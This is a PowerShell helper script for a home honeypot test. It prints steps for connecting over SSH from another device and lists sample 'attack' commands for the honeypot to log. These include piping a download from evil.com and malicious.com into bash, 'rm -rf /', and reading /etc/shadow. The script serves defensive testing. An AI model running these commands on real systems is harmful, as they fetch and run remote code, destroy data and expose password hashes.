# ========================================
# NETWORK TEST FROM OTHER DEVICE
# ========================================
# Instructions for your second device
# ========================================

Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║  INSTRUCTIONS FOR YOUR OTHER DEVICE        ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`n[STEP 1] Get Your Honeypot IP Address" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray

$networkIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -match '^192\.168\.' -or $_.IPAddress -match '^10\.' -or $_.IPAddress -match '^172\.(1[6-9]|2[0-9]|3[01])\.'} | Select-Object -First 1).IPAddress

if ($networkIP) {
    Write-Host "`n✅ Your Honeypot IP: $networkIP" -ForegroundColor Green
    Write-Host "`nUse this IP to connect from your other device!`n" -ForegroundColor Yellow
} else {
    Write-Host "`n⚠️  Could not detect network IP. Showing all IPs:" -ForegroundColor Yellow
    ipconfig | findstr IPv4
    Write-Host "`nUse the 192.168.x.x IP address`n" -ForegroundColor Gray
}

Write-Host "[STEP 2] On Your Other Device" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray
Write-Host "`n📱 If it's a laptop/PC with SSH client:" -ForegroundColor Cyan
Write-Host "   Open terminal and run:" -ForegroundColor White
Write-Host "   ssh -p 2222 root@$networkIP`n" -ForegroundColor Yellow

Write-Host "📱 If it's an Android phone:" -ForegroundColor Cyan
Write-Host "   1. Install 'Termux' app from Play Store" -ForegroundColor White
Write-Host "   2. Open Termux and run:" -ForegroundColor White
Write-Host "   pkg install openssh" -ForegroundColor Yellow
Write-Host "   ssh -p 2222 root@$networkIP`n" -ForegroundColor Yellow

Write-Host "📱 If it's an iPhone:" -ForegroundColor Cyan
Write-Host "   1. Install 'Terminus' app from App Store" -ForegroundColor White
Write-Host "   2. Add new host:" -ForegroundColor White
Write-Host "   Hostname: $networkIP" -ForegroundColor Yellow
Write-Host "   Port: 2222" -ForegroundColor Yellow
Write-Host "   Username: root`n" -ForegroundColor Yellow

Write-Host "[STEP 3] What to Type (Attack Simulation)" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray
Write-Host "`nWhen asked for password, type ANYTHING (e.g., 'password123')" -ForegroundColor White
Write-Host "Then run these attack commands:`n" -ForegroundColor White

Write-Host "1️⃣  HIGH SEVERITY ATTACK:" -ForegroundColor Red
Write-Host "   wget http://evil.com/cryptominer.sh && bash cryptominer.sh`n" -ForegroundColor Yellow

Write-Host "2️⃣  HIGH SEVERITY ATTACK:" -ForegroundColor Red
Write-Host "   curl http://malicious.com/backdoor | bash; rm -rf /`n" -ForegroundColor Yellow

Write-Host "3️⃣  MEDIUM SEVERITY:" -ForegroundColor Magenta
Write-Host "   cat /etc/passwd; cat /etc/shadow`n" -ForegroundColor Yellow

Write-Host "4️⃣  LOW SEVERITY:" -ForegroundColor Blue
Write-Host "   whoami; uname -a; ls -la`n" -ForegroundColor Yellow

Write-Host "5️⃣  Then type:" -ForegroundColor White
Write-Host "   exit`n" -ForegroundColor Yellow

Write-Host "[STEP 4] Verify on This Machine" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray
Write-Host "`nAfter running attacks from other device, run this:" -ForegroundColor White
Write-Host "   .\verify-network-attack.ps1`n" -ForegroundColor Yellow

Write-Host "════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "Press Enter when you're ready to test..." -ForegroundColor Gray
Read-Host
